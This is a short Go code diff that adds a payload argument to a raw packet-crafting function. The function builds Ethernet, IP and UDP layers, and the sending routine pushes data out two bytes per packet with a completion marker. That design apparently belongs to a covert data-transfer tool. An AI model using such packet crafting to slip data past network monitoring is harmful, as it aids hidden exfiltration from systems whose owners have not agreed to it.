@@ -87,10 +87,10 @@ func sendEncryptedData(port uint16, data, ip string) {
 		
 		if p == size {
 			temp := []byte{0, 0}
-			buffer = craftPacket(temp, ip, SND_CMPLETE);
+			buffer = craftPacket(temp, ip, SND_CMPLETE, []byte{});
 		} else {
 			temp := []byte{data[p], data[p+1]}
-			buffer = craftPacket(temp, ip, port); 
+			buffer = craftPacket(temp, ip, port, []byte{}); 
 		}
 		
 		if buffer == nil { // if original query was invalid
@@ -103,7 +103,7 @@ func sendEncryptedData(port uint16, data, ip string) {
 	}
 }
 
-func craftPacket(data []byte, ip string, port uint16) []byte {
+func craftPacket(data []byte, ip string, port uint16, payload []byte) []byte {
 	
 	ethernetLayer := &layers.Ethernet{
 		SrcMAC: localmac,
@@ -142,7 +142,7 @@ func craftPacket(data []byte, ip string, port uint16) []byte {
 		ComputeChecksums: true,
 	}
 
-	err = gopacket.SerializeLayers(buf, opts, ethernetLayer, ipLayer, udpLayer);
+	err = gopacket.SerializeLayers(buf, opts, ethernetLayer, ipLayer, udpLayer, gopacket.Payload(payload));
 	checkError(err);
 
 	return buf.Bytes()
